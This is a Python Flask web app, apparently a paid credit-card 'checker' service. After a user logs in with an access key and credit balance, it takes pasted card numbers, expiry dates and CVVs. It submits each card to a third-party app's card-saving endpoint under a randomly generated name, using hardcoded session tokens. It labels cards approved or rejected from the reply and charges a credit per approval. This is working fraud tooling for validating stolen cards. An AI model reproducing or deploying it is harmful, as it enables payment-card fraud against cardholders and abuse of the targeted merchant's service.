from flask import Flask, render_template, redirect, url_for, request, session
import requests
from bs4 import BeautifulSoup
import pandas as pd
import time
from flask import jsonify


app = Flask(__name__)
app.secret_key = 'chave_secreta'
@app.route('/', methods=['GET', 'POST'])
def login():
    error = None
    base = 'usuarios.json'
    database = pd.read_json(base)
    def get_saldo(access_key):
        for i in range(len(database)):
            if database.loc[i, 'chave'] == access_key:
                return database.loc[i, 'saldo']
        return 0
    if request.method == 'POST':
        chave = request.form['chave']
        if validar_chave(chave,database):
            session['chave'] = chave
            return redirect(url_for('index'))
        else:
            error = 'Chave de acesso inválida. Tente novamente.'
    return render_template('login.html', error=error)

def validar_chave(chave,database):
    # Verifique se a chave de acesso fornecida está na base de dados
    for i in range(len(database)):
        if database.loc[i, 'chave'] == chave:
            return True
    return False

@app.route('/index')
def index():
    if 'chave' not in session:
        return redirect(url_for('login'))
    return render_template('index.html')

@app.route('/index', methods=['GET','POST'])
def home():
    error = None
    if request.method == 'POST':
        base = 'usuarios.json'
        database = pd.read_json(base)
        def get_saldo(access_key):
            for i in range(len(database)):
                if database.loc[i, 'chave'] == access_key:
                    return database.loc[i, 'saldo']
            return 0
        access_key = session.get('chave', None)  # retrieve access key from session
        saldo = get_saldo(access_key)  # retrieve saldo based on access key
        print("SALDO",saldo)
        if saldo > 0:
            # execute code
            numero = request.form['numero']
            import requests
            import json
            import random
            # Inicialização de Variáveis
            nomes = ['João', 'Maria', 'José', 'Ana', 'Pedro', 'Carla', 'Lucas', 'Fernanda', 'Gustavo', 'Carolina']
            sobrenomes = ['Santos', 'Silva', 'Souza', 'Oliveira', 'Lima', 'Sá', 'Barbosa', 'Almeida', 'Pereira',
                          'Costa']

            # Funções
            def getStr(string, start, end):
                str = string.split(start)
                str = str[1].split(end)
                return str[0]

            def multiexplode(delimiters, string):
                one = string.replace(delimiters, delimiters[0])
                two = one.split(delimiters[0])
                return two

            # Randomização de Variáveis
            nome_indice = random.randrange(0, len(nomes))
            sobrenome_indice = random.randrange(0, len(sobrenomes))

            nome = nomes[nome_indice] + ' ' + sobrenomes[sobrenome_indice]

            randomizavalor = random.randrange(11, 99)
            randomizapedido = random.randrange(11111, 99999)
            token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTEwMzIyMDIsIm9yaWdJYXQiOjE2Nzk0OTYyMDIsInVzZXJuYW1lIjoieWF5YWtpZDYxMyJ9.WELXOTxfHiLDTH3IM33JmuKivd92jyVouOL1hFkkQUA"
            # Estrutura do Programa
            lista = numero
            separar = lista.split("|")
            cc = separar[0]
            mes = separar[1]
            ano = separar[2]
            cvv = separar[3]
            ccm = "+".join(cc[i:i + 4] for i in range(0, len(cc), 4))
            if ano == '2021':
                ano = '21'
            elif ano == '2022':
                ano = '22'
            elif ano == '2023':
                ano = '23'
            elif ano == '2024':
                ano = '24'
            elif ano == '2025':
                ano = '25'
            elif ano == '2026':
                ano = '26'
            elif ano == '2027':
                ano = '27'
            elif ano == '2028':
                ano = '28'
            elif ano == '2029':
                ano = '29'
            elif ano == '2030':
                ano = '30'

            if mes == '01':
                mes = '1'
            elif mes == '02':
                mes = '2'
            elif mes == '03':
                mes = '3'
            elif mes == '04':
                mes = '4'
            elif mes == '05':
                mes = '5'
            elif mes == '06':
                mes = '6'
            elif mes == '07':
                mes = '7'
            elif mes == '08':
                mes = '8'
            elif mes == '09':
                mes = '9'
            import requests
            import json
            token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImNvZGlnb1BhaXMiOjU3LCJhY2NlcHRvVGVybWlub3MiOnRydWUsImF2YXRhciI6IjEiLCJlc3RhZG8iOiJIYWJpbGl0YWRvIiwibWV0b2Rvc1BhZ28iOltdLCJfaWQiOiI2MzhmOGE3MmVhM2I2ZTAwMThkODgyMjgiLCJub21icmUiOiJTQURTRCBBU0QiLCJhcGVsbGlkbyI6IkRBU0RTIiwiZW1haWwiOiJkYXRhcDYxNDI0QGNvdmJhc2UuY29tIiwicGFzc3dvcmQiOiIkMmEkMTAkU0pjUVZObkNkVGRrLlBaeHJJRmMzT2cwalZTUkZvSWl2NVlLMlpoeXZzY3k2dVFDQnd2RW0iLCJ0ZWxlZm9ubyI6MTE5OTkxNjUxLCJ0aXBvIjoiVXN1YXJpbyIsImNyZWF0ZWRBdCI6IjIwMjItMTItMDZUMTg6MzE6MTQuNjcyWiIsIl9fdiI6MH0sImlhdCI6MTY3MDM1MTQ5MCwiZXhwIjoxNzMwODMxNDkwfQ.o7we4xNzed4L-EqagMvKWMeynmX6J9CEzsdYT75exHk"
            url = 'https://roomservice-app.herokuapp.com/pagos/guardarTarjeta'
            headers = {
                'authorization': f'JWT {token}',
                'content-type': 'application/json; charset=UTF-8',
                'host': 'roomservice-app.herokuapp.com',
                'user-agent': 'Dart/2.12 (dart:io)'
            }
            payload = {
                'usuario': {
                    'name': nome,
                    'email': 'datap61424@covbase.com',
                    'city': 'Bogota',
                    'address': 'Bogota',
                    'cell_phone': 119991651,
                    'id': '638f8a72ea3b6e0018d88228'
                },
                'card': {
                    'name': nome,
                    'number': cc,
                    'exp_year': f'20{ano}',
                    'exp_month': mes,
                    'cvc': cvv
                }
            }
            response = requests.post(url, headers=headers, data=json.dumps(payload))
            print(response.text)
            data = response.text
            database = pd.read_json(base)
            def remove_saldo(access_key):
                for i in range(len(database)):
                    if database.loc[i, 'chave'] == access_key:
                        database.loc[i, 'saldo'] -= 1
                        formatted_data = database.to_json(orient='records', indent=4)
                        with open(base, 'w') as outfile:
                            outfile.write(formatted_data)
                        return True
                return False
            time.sleep(2)
            if '¡Método de pago agregado!' in data:

                remove_saldo(access_key)
                database = pd.read_json(base)
                saldoatual = get_saldo(access_key)
                saldoatual = int(saldoatual)
                saldo_formatado = "{:,d}".format(saldoatual)
                numero = f"#Aprovado= {numero}Seu saldo é ={saldoatual}"
                print("Pagamento Aprovado com sucesso!")
            elif 'Error al guardar la tarjeta, por favor intenta de nuevo.' in data:
                database = pd.read_json(base)
                saldoatual = get_saldo(access_key)
                saldoatual = int(saldoatual)
                saldo_formatado = "{:,d}".format(saldoatual)
                print(saldoatual)
                print("Reprovada")
                numero = f"#Reprovado = {numero}Seu saldo é ={saldoatual}"
            else:
                print("ERRO>",numero)

            return numero
        else:
            error = '#Seus creditos Acabaram'
        return error



if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
